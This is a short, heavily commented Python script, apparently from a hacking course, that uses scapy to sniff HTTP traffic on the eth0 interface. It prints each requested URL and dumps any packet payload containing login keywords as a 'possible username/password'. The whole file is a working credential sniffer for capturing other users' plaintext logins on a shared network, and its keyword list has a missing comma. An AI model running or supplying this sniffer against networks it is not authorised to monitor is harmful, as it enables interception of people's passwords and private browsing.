#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http  # scapy don't have a build-in http filter


#  sniff function - get an interface, use the scapy.sniff function to sniff every packet passing on the interface,
#  the function set not to store packets on memory but to pass them to the process_sniffed_packet function to be process
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)  # chose interface,  not to store packet data,
    #  & to use a callback function to handle the packet sniffed


#  get_url function - gets a packet read the Host & the Path fields from the http layer then return the url as byte type
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # return the Host & Path fields concat


#  get_login_info function - gets a packet, check if there is raw layer in the packet if there is,
#  convert to str & save the load field to the load variable, then check if a list of keywords one by one are in the
#  load field, if one of them found, return the load variable as a string
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # check if the packet have a raw layer
        load = str(packet[scapy.Raw].load)  # convert to str & save the packet data in to a variable
        keywords = ["user", "username", "uname", "name" "email", "mail", "login", "pass", "password"]  # list of keyword
        for keyword in keywords:  # check elements one by one
            if keyword in load:  # if element is in the packet data
                return load


#  process_sniffed_packet function - check if there is http layer in the packet, if there is it send the packet to
#  the get_url function (that return the url), then prints the url
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):  # check if the packet have a http layer
        url = get_url(packet)  # capture the data (url) returned from the get_url function into a variable
        print("[+] HTTP Request >> " + url.decode())  # convert the url to str & print it

        login_info = get_login_info(packet)  # capture the returned data from the get_login_info function to a variable
        if login_info:  # check if there is data returned from the get_login_info function
            print("\n\n[+] Possible username/password" + login_info + "\n\n")  # if there is, print the line


sniff("eth0")